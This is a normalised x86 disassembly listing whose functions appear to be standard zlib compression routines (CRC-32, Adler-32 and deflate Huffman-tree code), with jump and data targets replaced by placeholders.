mov eax [ ecx + 0x1c ]
cmp eax edx
je r-xdata
mov [ eax + 0x1c ] edx
mov [ ecx + 0x14 ] edx
mov [ ecx + 0x8 ] edx
mov [ ecx + 0x18 ] edx
mov [ ecx + 0x30 ] 0x1
lea ecx [ eax + 0x530 ]
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x14 ] 0x8000
mov [ eax + 0x20 ] edx
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] edx
mov [ eax + 0x38 ] edx
mov [ eax + 0x3c ] edx
mov [ eax + 0x6c ] ecx
mov [ eax + 0x50 ] ecx
mov [ eax + 0x4c ] ecx
xor eax eax
retn
sub_1000b242
mov eax [ esp + 0xc ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
push 0xfffffffa
mov al [ eax ]
cmp al [ rw-data ]
jne r-xdata
cmp [ esp + 0x18 ] 0x38
jne r-xdata
mov esi [ esp + 0xc ]
cmp esi edi
je r-xdata
push 0xfffffffe
jmp r-xdata
cmp [ esi + 0x20 ] edi
mov [ esi + 0x18 ] edi
jne r-xdata
pop eax
cmp [ esi + 0x24 ] edi
jne r-xdata
mov [ esi + 0x20 ] sub_1000b5c5
mov [ esi + 0x28 ] edi
push 0x2530
push 0x1
push [ esi + 0x28 ]
call [ esi + 0x20 ]
add esp 0xc
cmp eax edi
jne r-xdata
mov [ esi + 0x24 ] sub_1000b5d7
mov ecx [ esp + 0x10 ]
mov [ esi + 0x1c ] eax
cmp ecx edi
jge r-xdata
push 0xfffffffc
jmp r-xdata
mov edx ecx
sar edx 0x4
inc edx
cmp ecx 0x30
mov [ eax + 0x8 ] edx
jge r-xdata
mov [ eax + 0x8 ] edi
neg ecx
jmp r-xdata
cmp ecx 0x8
jl r-xdata
and ecx 0xf
push eax
push [ esi + 0x28 ]
call [ esi + 0x24 ]
pop ecx
mov [ esi + 0x1c ] edi
pop ecx
cmp ecx 0xf
jg r-xdata
push esi
mov [ eax + 0x24 ] ecx
mov [ eax + 0x34 ] edi
call sub_1000b1e7
pop ecx
jmp r-xdata
pop edi
pop esi
retn
sub_1000b2fb
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
push 0xfffffffe
pop eax
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
push [ esi + 0x1c ]
push [ esi + 0x28 ]
call [ esi + 0x24 ]
and [ esi + 0x1c ] 0x0
pop ecx
pop ecx
xor eax eax
pop esi
retn
push eax
push [ esi + 0x28 ]
call ecx
pop ecx
pop ecx
sub_1000b358
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ ebp + 0x10 ] 0x0
push esi
push edi
not eax
mov esi 0xff
je r-xdata
cmp [ ebp + 0x10 ] 0x20
mov edi [ ebp + 0xc ]
push ebx
push 0x4
pop edx
jb r-xdata
test [ ebp + 0xc ] 0x3
je r-xdata
cmp [ ebp + 0x10 ] edx
jb r-xdata
mov ecx [ ebp + 0x10 ]
shr ecx 0x5
mov [ ebp + 0x8 ] ecx
mov edx [ ebp + 0xc ]
mov ecx eax
and ecx esi
movzx edx [ edx ]
xor ecx edx
shr eax 0x8
mov ecx [ ecx * 4 + r--data ]
xor eax ecx
inc [ ebp + 0xc ]
dec [ ebp + 0x10 ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
pop ebx
je r-xdata
mov ecx [ ebp + 0x10 ]
shr ecx 0x2
mov [ ebp + 0x8 ] ecx
xor eax [ edi ]
xor ecx ecx
xor ebx ebx
add edi edx
mov [ ebp + 0xc ] eax
mov bl ah
mov cl [ ebp + 0xe ]
mov ecx [ ecx * 4 + r--data ]
xor ecx [ ebx * 4 + r--data ]
mov ebx eax
shr ebx 0x18
and eax esi
xor ecx [ ebx * 4 + r--data ]
xor ebx ebx
xor ecx [ eax * 4 + r--data ]
xor eax eax
xor ecx [ edi ]
add edi edx
mov [ ebp + 0xc ] ecx
mov bl ch
mov al [ ebp + 0xe ]
mov eax [ eax * 4 + r--data ]
xor eax [ ebx * 4 + r--data ]
mov ebx ecx
shr ebx 0x18
and ecx esi
xor eax [ ebx * 4 + r--data ]
xor ebx ebx
xor eax [ ecx * 4 + r--data ]
xor ecx ecx
xor eax [ edi ]
add edi edx
mov [ ebp + 0xc ] eax
mov bl ah
mov cl [ ebp + 0xe ]
mov ecx [ ecx * 4 + r--data ]
xor ecx [ ebx * 4 + r--data ]
mov ebx eax
shr ebx 0x18
and eax esi
xor ecx [ ebx * 4 + r--data ]
xor ebx ebx
xor ecx [ eax * 4 + r--data ]
xor eax eax
xor ecx [ edi ]
add edi edx
mov [ ebp + 0xc ] ecx
mov bl ch
mov al [ ebp + 0xe ]
mov eax [ eax * 4 + r--data ]
xor eax [ ebx * 4 + r--data ]
mov ebx ecx
shr ebx 0x18
and ecx esi
xor eax [ ebx * 4 + r--data ]
xor ebx ebx
xor eax [ ecx * 4 + r--data ]
xor ecx ecx
xor eax [ edi ]
add edi edx
mov [ ebp + 0xc ] eax
mov bl ah
mov cl [ ebp + 0xe ]
mov ecx [ ecx * 4 + r--data ]
xor ecx [ ebx * 4 + r--data ]
mov ebx eax
shr ebx 0x18
and eax esi
xor ecx [ ebx * 4 + r--data ]
xor ebx ebx
xor ecx [ eax * 4 + r--data ]
xor eax eax
xor ecx [ edi ]
add edi edx
mov [ ebp + 0xc ] ecx
mov bl ch
mov al [ ebp + 0xe ]
mov eax [ eax * 4 + r--data ]
xor eax [ ebx * 4 + r--data ]
mov ebx ecx
shr ebx 0x18
xor eax [ ebx * 4 + r--data ]
and ecx esi
xor ebx ebx
sub [ ebp + 0x10 ] 0x20
xor eax [ ecx * 4 + r--data ]
xor ecx ecx
xor eax [ edi ]
add edi edx
mov [ ebp + 0xc ] eax
mov bl ah
mov cl [ ebp + 0xe ]
mov ecx [ ecx * 4 + r--data ]
xor ecx [ ebx * 4 + r--data ]
mov ebx eax
shr ebx 0x18
and eax esi
xor ecx [ ebx * 4 + r--data ]
xor ebx ebx
xor ecx [ eax * 4 + r--data ]
xor eax eax
xor ecx [ edi ]
add edi edx
mov [ ebp + 0xc ] ecx
mov bl ch
mov al [ ebp + 0xe ]
mov eax [ eax * 4 + r--data ]
xor eax [ ebx * 4 + r--data ]
mov ebx ecx
shr ebx 0x18
and ecx esi
xor eax [ ebx * 4 + r--data ]
xor eax [ ecx * 4 + r--data ]
dec [ ebp + 0x8 ]
jne r-xdata
pop edi
pop esi
not eax
pop ebp
retn
movzx edx [ edi ]
mov ecx eax
and ecx esi
xor ecx edx
shr eax 0x8
mov ecx [ ecx * 4 + r--data ]
xor eax ecx
inc edi
dec [ ebp + 0x10 ]
jne r-xdata
xor eax [ edi ]
xor ecx ecx
xor ebx ebx
sub [ ebp + 0x10 ] edx
mov [ ebp + 0xc ] eax
mov bl ah
mov cl [ ebp + 0xe ]
add edi edx
mov ecx [ ecx * 4 + r--data ]
xor ecx [ ebx * 4 + r--data ]
mov ebx eax
shr ebx 0x18
and eax esi
xor ecx [ ebx * 4 + r--data ]
xor ecx [ eax * 4 + r--data ]
dec [ ebp + 0x8 ]
mov eax ecx
jne r-xdata
sub_1000b5e3
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x1
mov edi esi
pop eax
shr edi 0x10
and esi 0xffff
cmp ebx eax
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
add esi eax
mov eax 0xfff1
cmp esi eax
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp ebx 0x10
jae r-xdata
add edi esi
cmp edi eax
jb r-xdata
sub esi eax
cmp ebx 0x15b0
jb r-xdata
mov eax ebx
dec ebx
test eax eax
je r-xdata
mov eax edi
sub edi eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
xor edx edx
mov ebx 0x15b0
div ebx
mov ebx [ ebp + 0x10 ]
mov [ ebp + 0xc ] eax
mov ecx 0xfff1
cmp esi ecx
jb r-xdata
lea eax [ ebx + 0x1 ]
cmp ebx 0x10
jb r-xdata
movzx edx [ ecx ]
add esi edx
movzx edx [ ecx + 0x1 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x2 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x3 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x4 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x5 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x6 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x7 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x8 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x9 ]
add edi esi
add esi edx
movzx edx [ ecx + 0xa ]
add edi esi
add esi edx
movzx edx [ ecx + 0xb ]
add edi esi
add esi edx
movzx edx [ ecx + 0xc ]
add edi esi
add esi edx
movzx edx [ ecx + 0xd ]
add edi esi
add esi edx
movzx edx [ ecx + 0xe ]
add edi esi
add esi edx
movzx edx [ ecx + 0xf ]
add edi esi
add esi edx
add edi esi
add ecx 0x10
dec eax
jne r-xdata
mov eax esi
xor edx edx
mov esi 0xfff1
div esi
mov eax edi
mov edi 0xfff1
mov esi edx
xor edx edx
div edi
dec [ ebp + 0xc ]
mov edi edx
jne r-xdata
mov eax edi
xor edx edx
div ecx
mov eax edx
jmp r-xdata
sub esi ecx
movzx edx [ ecx ]
add esi edx
inc ecx
add edi esi
dec eax
jne r-xdata
mov eax ebx
dec ebx
test eax eax
je r-xdata
mov eax ebx
shr eax 0x4
sub ebx 0x15b0
mov eax 0x15b
shl eax 0x10
or eax esi
mov ecx 0xfff1
mov eax esi
xor edx edx
mov esi ecx
div esi
mov eax edi
mov esi edx
xor edx edx
div ecx
mov edi edx
lea eax [ ebx + 0x1 ]
movzx edx [ ecx ]
add esi edx
sub ebx 0x10
movzx edx [ ecx + 0x1 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x2 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x3 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x4 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x5 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x6 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x7 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x8 ]
add edi esi
add esi edx
movzx edx [ ecx + 0x9 ]
add edi esi
add esi edx
movzx edx [ ecx + 0xa ]
add edi esi
add esi edx
movzx edx [ ecx + 0xb ]
add edi esi
add esi edx
movzx edx [ ecx + 0xc ]
add edi esi
add esi edx
movzx edx [ ecx + 0xd ]
add edi esi
add esi edx
movzx edx [ ecx + 0xe ]
add edi esi
add esi edx
movzx edx [ ecx + 0xf ]
add edi esi
add esi edx
add edi esi
add ecx 0x10
dec eax
jne r-xdata
movzx edx [ ecx ]
add esi edx
inc ecx
add edi esi
dec eax
jne r-xdata
sub_1000b810
call sub_1000b87c
mov eax [ esp + 0x4 ]
push eax
lea ecx [ eax + 0x94 ]
and [ eax + 0x16b8 ] 0x0
and [ eax + 0x16bc ] 0x0
mov [ eax + 0xb18 ] ecx
lea ecx [ eax + 0x988 ]
mov [ eax + 0xb20 ] rw-data
mov [ eax + 0xb24 ] ecx
lea ecx [ eax + 0xa7c ]
mov [ eax + 0xb2c ] rw-data
mov [ eax + 0xb30 ] ecx
mov [ eax + 0xb38 ] rw-data
mov [ eax + 0x16b4 ] 0x8
call sub_1000b87d
pop ecx
retn
sub_1000b87d
mov eax [ esp + 0x4 ]
push esi
mov edx 0x11e
xor esi esi
lea ecx [ eax + 0x94 ]
mov [ ecx ] si
add ecx 0x4
dec edx
jne r-xdata
push 0x1e
lea ecx [ eax + 0x988 ]
pop edx
mov [ ecx ] si
add ecx 0x4
dec edx
jne r-xdata
push 0x13
lea ecx [ eax + 0xa7c ]
pop edx
mov [ ecx ] si
add ecx 0x4
dec edx
jne r-xdata
mov [ eax + 0x16ac ] esi
mov [ eax + 0x16a8 ] esi
mov [ eax + 0x16b0 ] esi
mov [ eax + 0x16a0 ] esi
mov [ eax + 0x494 ] 0x1
pop esi
retn
sub_1000b8df
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16bc ]
cmp ecx 0xd
jle r-xdata
mov edx [ ebp + 0x14 ]
shl edx cl
or [ eax + 0x16b8 ] dx
add ecx 0x3
mov [ eax + 0x16bc ] ecx
mov edx [ ebp + 0x14 ]
push ebx
push esi
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
push edi
or [ eax + 0x16b8 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + esi ] bl
inc [ eax + 0x14 ]
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ edi + esi ] cl
mov esi [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
sub cx si
pop edi
shr dx cl
add esi 0xfffffff3
mov [ eax + 0x16bc ] esi
pop esi
pop ebx
mov [ eax + 0x16b8 ] dx
jmp r-xdata
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1000d03d
add esp 0x10
pop ebp
retn
sub_1000b974
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push 0x2
mov ecx [ esi + 0x16bc ]
pop eax
cmp ecx 0xd
jle r-xdata
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx 0x3
mov [ esi + 0x16bc ] ecx
shl eax cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b8 ] ax
mov eax [ esi + 0x8 ]
mov dl [ esi + 0x16b8 ]
mov [ eax + ecx ] dl
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
xor ecx ecx
mov cl [ esi + 0x16b9 ]
mov [ edx + eax ] cl
mov eax [ esi + 0x16bc ]
inc [ esi + 0x14 ]
mov cx 0x10
sub cx ax
mov dx 0x2
shr dx cl
add eax 0xfffffff3
mov [ esi + 0x16bc ] eax
mov [ esi + 0x16b8 ] dx
jmp r-xdata
mov eax [ r--data ]
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx edi
mov [ esi + 0x16bc ] ecx
movzx eax [ r--data ]
mov edx eax
shl edx cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b8 ] dx
mov edx [ esi + 0x14 ]
mov bl [ esi + 0x16b8 ]
mov [ ecx + edx ] bl
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b9 ]
mov [ ebx + ecx ] dl
mov edx [ esi + 0x16bc ]
inc [ esi + 0x14 ]
mov cx 0x10
sub cx dx
shr ax cl
mov [ esi + 0x16b8 ] ax
lea eax [ edx + edi - 0x10 ]
mov [ esi + 0x16bc ] eax
jmp r-xdata
movzx edi [ r--data ]
mov ecx [ esi + 0x16bc ]
push 0x10
pop eax
sub eax edi
cmp ecx eax
jle r-xdata
mov [ esi + 0x16b4 ] 0x7
pop edi
pop esi
pop ebx
retn
push 0x2
cmp ecx 0xd
pop eax
jle r-xdata
push esi
call sub_1000cf62
mov eax [ esi + 0x16b4 ]
pop ecx
mov ecx [ esi + 0x16bc ]
sub eax ecx
add eax 0xb
cmp eax 0x9
jge r-xdata
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx 0x3
mov [ esi + 0x16bc ] ecx
shl eax cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b8 ] ax
mov eax [ esi + 0x8 ]
mov dl [ esi + 0x16b8 ]
mov [ eax + ecx ] dl
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
xor ecx ecx
mov cl [ esi + 0x16b9 ]
mov [ edx + eax ] cl
mov eax [ esi + 0x16bc ]
inc [ esi + 0x14 ]
mov cx 0x10
sub cx ax
mov dx 0x2
shr dx cl
add eax 0xfffffff3
mov [ esi + 0x16bc ] eax
mov [ esi + 0x16b8 ] dx
jmp r-xdata
mov eax [ r--data ]
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx edi
mov [ esi + 0x16bc ] ecx
movzx eax [ r--data ]
mov edx eax
shl edx cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b8 ] dx
mov edx [ esi + 0x14 ]
mov bl [ esi + 0x16b8 ]
mov [ ecx + edx ] bl
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b9 ]
mov [ ebx + ecx ] dl
mov edx [ esi + 0x16bc ]
inc [ esi + 0x14 ]
mov cx 0x10
sub cx dx
shr ax cl
mov [ esi + 0x16b8 ] ax
lea eax [ edx + edi - 0x10 ]
mov [ esi + 0x16bc ] eax
jmp r-xdata
movzx edi [ r--data ]
mov ecx [ esi + 0x16bc ]
push 0x10
pop eax
sub eax edi
cmp ecx eax
jle r-xdata
push esi
call sub_1000cf62
pop ecx
sub_1000bba3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
cmp [ esi + 0x84 ] eax
mov edi [ ebp + 0x10 ]
jle r-xdata
lea ecx [ edi + 0x5 ]
cmp edi eax
jbe r-xdata
cmp [ esi + 0x88 ] 0x4
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea eax [ esi + 0xb18 ]
push eax
push esi
call sub_1000bd9b
lea eax [ esi + 0xb24 ]
push eax
push esi
call sub_1000bd9b
push esi
call sub_1000c297
mov edx [ esi + 0x16a8 ]
mov ecx [ esi + 0x16ac ]
add edx 0xa
add ecx 0xa
shr edx 0x3
shr ecx 0x3
add esp 0x14
cmp ecx edx
ja r-xdata
mov eax [ esi ]
cmp [ eax + 0x2c ] 0x2
jne r-xdata
mov ecx [ esi + 0x16bc ]
mov eax [ ebp + 0x14 ]
cmp ecx 0xd
jle r-xdata
cmp ecx edx
je r-xdata
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_1000b8df
add esp 0x10
jmp r-xdata
push ebx
lea ebx [ edi + 0x4 ]
cmp ebx edx
ja r-xdata
jmp r-xdata
push esi
call sub_1000cefd
pop ecx
add eax 0x2
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx 0x3
mov [ esi + 0x16bc ] ecx
add eax 0x2
mov edx eax
shl edx cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b8 ] dx
mov edx [ esi + 0x14 ]
mov bl [ esi + 0x16b8 ]
mov [ ecx + edx ] bl
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b9 ]
mov [ ecx + edi ] dl
mov edx [ esi + 0x16bc ]
inc [ esi + 0x14 ]
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff3
mov [ esi + 0x16bc ] edx
mov [ esi + 0x16b8 ] ax
jmp r-xdata
mov ecx [ esi + 0x16bc ]
mov edx [ ebp + 0x14 ]
cmp ecx 0xd
jle r-xdata
push esi
call sub_1000b87d
cmp [ ebp + 0x14 ] 0x0
pop ecx
pop ebx
je r-xdata
mov edx ecx
pop edi
pop esi
pop ebp
retn
push esi
call sub_1000cfd9
pop ecx
push r--data
push r--data
push esi
call sub_1000cb12
add esp 0xc
add edx 0x4
shl edx cl
or [ esi + 0x16b8 ] dx
add ecx 0x3
mov [ esi + 0x16bc ] ecx
add edx 0x4
mov edi edx
shl edi cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b8 ] di
mov edi [ esi + 0x14 ]
mov bl [ esi + 0x16b8 ]
mov [ ecx + edi ] bl
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
xor ebx ebx
mov bl [ esi + 0x16b9 ]
mov [ ecx + edi ] bl
mov edi [ esi + 0x16bc ]
inc [ esi + 0x14 ]
mov cx 0x10
sub cx di
shr dx cl
add edi 0xfffffff3
mov [ esi + 0x16bc ] edi
mov [ esi + 0x16b8 ] dx
jmp r-xdata
inc eax
push eax
mov eax [ esi + 0xb28 ]
inc eax
push eax
mov eax [ esi + 0xb1c ]
inc eax
push eax
push esi
call sub_1000c3bb
lea eax [ esi + 0x988 ]
push eax
lea eax [ esi + 0x94 ]
push eax
push esi
call sub_1000cb12
add esp 0x1c
jmp r-xdata
sub_1000bd9b
push ebp
mov ebp esp
sub esp 0x10
mov edx [ ebp + 0xc ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push esi
mov eax [ edx + 0x8 ]
mov esi [ ebp + 0x8 ]
mov ebx [ edx ]
push edi
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + 0xc ]
xor eax eax
mov [ ebp - 0x8 ] ecx
cmp ecx eax
mov [ esi + 0x1450 ] eax
mov [ esi + 0x1454 ] 0x23d
jle r-xdata
mov edi [ esi + 0x1450 ]
cmp edi 0x2
jge r-xdata
mov [ ebp + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ esi + 0x1450 ]
cdq
sub eax edx
mov edi eax
sar edi 0x1
cmp edi 0x1
jl r-xdata
cmp [ ebp - 0x4 ] 0x2
jge r-xdata
mov edi [ ebp + 0x8 ]
and [ edi + 0x2 ] 0x0
inc [ esi + 0x1450 ]
mov edi [ esi + 0x1450 ]
mov [ ebp - 0x4 ] eax
mov [ esi + edi * 4 + 0xb5c ] eax
and [ eax + esi + 0x1458 ] 0x0
jmp r-xdata
lea eax [ ebx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp + 0x8 ] eax
push edi
push ebx
push esi
call sub_1000bfb1
add esp 0xc
dec edi
cmp edi 0x1
jge r-xdata
xor eax eax
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x0
je r-xdata
add [ ebp + 0x8 ] 0x4
inc eax
cmp eax ecx
jl r-xdata
movzx eax al
movzx eax cl
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ esi + 0x1450 ]
cmp edi 0x2
jl r-xdata
movzx eax [ ecx + eax + 0x2 ]
sub [ esi + 0x16ac ] eax
lea ecx [ edi + 0x1 ]
mov [ esi + 0x1450 ] ecx
mov [ esi + ecx * 4 + 0xb5c ] eax
mov ecx eax
shl ecx 0x2
mov [ ecx + ebx ] 0x1
and [ esi + eax + 0x1458 ] 0x0
mov eax [ ebp - 0xc ]
dec [ esi + 0x16a8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1450 ]
mov edi [ esi + 0xb60 ]
push 0x1
push ebx
mov ecx [ esi + eax * 4 + 0xb5c ]
dec eax
push esi
mov [ esi + 0xb60 ] ecx
mov [ esi + 0x1450 ] eax
call sub_1000bfb1
mov eax [ esi + 0xb60 ]
add esp 0xc
dec [ esi + 0x1454 ]
mov ecx [ esi + 0x1454 ]
lea edx [ ebx + edi * 4 ]
mov [ esi + ecx * 4 + 0xb5c ] edi
dec [ esi + 0x1454 ]
mov ecx [ esi + 0x1454 ]
mov [ ebp - 0x10 ] edx
mov [ esi + ecx * 4 + 0xb5c ] eax
lea ecx [ ebx + eax * 4 ]
mov [ ebp - 0xc ] ecx
mov cx [ ecx ]
add cx [ edx ]
mov edx [ ebp + 0x8 ]
mov [ edx ] cx
mov cl [ esi + edi + 0x1458 ]
mov al [ esi + eax + 0x1458 ]
cmp cl al
jb r-xdata
dec [ esi + 0x1454 ]
push [ ebp + 0xc ]
mov ecx [ esi + 0xb60 ]
lea eax [ esi + 0x1454 ]
push esi
mov eax [ eax ]
mov [ esi + eax * 4 + 0xb5c ] ecx
call sub_1000c064
add esi 0xb3c
push esi
push [ ebp - 0x4 ]
push ebx
call sub_1000c22f
add esp 0x14
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
inc al
add [ ebp + 0x8 ] 0x4
push 0x1
mov [ esi + ecx + 0x1458 ] al
mov eax [ ebp - 0xc ]
push ebx
push esi
mov [ eax + 0x2 ] cx
mov eax [ ebp - 0x10 ]
mov [ eax + 0x2 ] cx
mov [ esi + 0xb60 ] ecx
inc ecx
mov [ ebp - 0x8 ] ecx
call sub_1000bfb1
add esp 0xc
cmp [ esi + 0x1450 ] 0x2
jge r-xdata
mov ecx [ ebp - 0x8 ]
sub_1000bfb1
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov edx [ eax + ecx * 4 + 0xb5c ]
add ecx ecx
mov [ ebp + 0x8 ] edx
mov edx [ eax + 0x1450 ]
cmp ecx edx
push edi
jg r-xdata
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
pop edi
pop esi
mov [ eax + edx * 4 + 0xb5c ] ecx
pop ebx
pop ebp
retn
mov edi [ ebp + 0xc ]
mov esi [ eax + ecx * 4 + 0xb5c ]
mov edx [ ebp + 0x8 ]
mov dx [ edi + edx * 4 ]
mov bx [ edi + esi * 4 ]
cmp dx bx
jb r-xdata
mov esi [ eax + ecx * 4 + 0xb60 ]
mov edx [ eax + ecx * 4 + 0xb5c ]
mov bx [ edi + esi * 4 ]
mov dx [ edi + edx * 4 ]
cmp bx dx
jb r-xdata
jne r-xdata
inc ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ecx
shl ecx 0x1
mov [ eax + edx * 4 + 0xb5c ] esi
mov edx [ eax + 0x1450 ]
cmp ecx edx
jle r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx + eax + 0x1458 ]
cmp dl [ esi + eax + 0x1458 ]
jbe r-xdata
mov dl [ esi + eax + 0x1458 ]
mov esi [ eax + ecx * 4 + 0xb5c ]
cmp dl [ esi + eax + 0x1458 ]
ja r-xdata
jge r-xdata
sub_1000c064
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0xc ]
push ebx
mov edx [ ebp + 0x8 ]
push esi
mov ebx [ eax ]
mov ecx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] ecx
push edi
push 0x8
mov ecx [ eax ]
lea edi [ edx + 0xb3c ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
pop ecx
xor eax eax
and [ ebp + 0xc ] 0x0
[ edi ]
mov ecx [ edx + 0x1454 ]
lea eax [ edx + 0x1454 ]
mov ecx [ edx + ecx * 4 + 0xb5c ]
and [ ebx + ecx * 4 + 0x2 ] 0x0
mov eax [ eax ]
inc eax
mov ecx 0x23d
cmp eax ecx
jge r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea esi [ edx + eax * 4 + 0xb5c ]
sub ecx eax
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x14 ] ecx
add eax ecx
mov edi [ ebp + 0x8 ]
cmp esi [ ebp - 0x18 ]
mov [ edi + ebx + 0x2 ] cx
jg r-xdata
mov ecx [ ebp - 0xc ]
inc [ ebp + 0xc ]
add [ ebp - 0x8 ] 0x4
dec [ ebp - 0x14 ]
jne r-xdata
inc [ edx + ecx * 2 + 0xb3c ]
and [ ebp - 0x4 ] 0x0
cmp esi [ ebp - 0x10 ]
jl r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ecx ]
mov ecx esi
shl ecx 0x2
mov [ ebp + 0x8 ] ecx
movzx ecx [ ecx + ebx + 0x2 ]
movzx ecx [ ebx + ecx * 4 + 0x2 ]
inc ecx
cmp ecx [ ebp - 0xc ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
movzx edi [ esi + ebx ]
mov esi [ ebp - 0x4 ]
add esi ecx
mov ecx [ ebp - 0x20 ]
imul esi edi
add [ edx + 0x16a8 ] esi
test ecx ecx
je r-xdata
sub esi [ ebp - 0x10 ]
mov edi [ ebp - 0x1c ]
mov esi [ edi + esi * 4 ]
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0xc ]
mov esi [ ebp + 0x8 ]
movzx ecx [ esi + ecx + 0x2 ]
add ecx [ ebp - 0x4 ]
imul ecx edi
add [ edx + 0x16ac ] ecx
dec [ edx + ecx * 2 + 0xb3c ]
add [ edx + ecx * 2 + 0xb3e ] 0x2
sub [ ebp + 0xc ] 0x2
dec [ edx + esi * 2 + 0xb3c ]
cmp [ ebp + 0xc ] 0x0
lea ecx [ edx + ecx * 2 + 0xb3e ]
jg r-xdata
dec ecx
dec edi
dec edi
jmp r-xdata
lea ecx [ esi - 0x1 ]
lea edi [ edx + ecx * 2 + 0xb3c ]
test esi esi
mov [ ebp + 0xc ] esi
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
lea esi [ edx + esi * 2 + 0xb3c ]
mov [ ebp - 0x14 ] esi
mov esi [ ebp - 0x14 ]
dec [ ebp + 0xc ]
dec esi
dec esi
cmp [ ebp + 0xc ] 0x0
mov [ ebp - 0x14 ] esi
jne r-xdata
lea esi [ edx + eax * 4 + 0xb5c ]
movzx ecx [ esi ]
test ecx ecx
mov [ ebp + 0x8 ] ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
movzx esi [ ebx + ecx * 4 + 0x2 ]
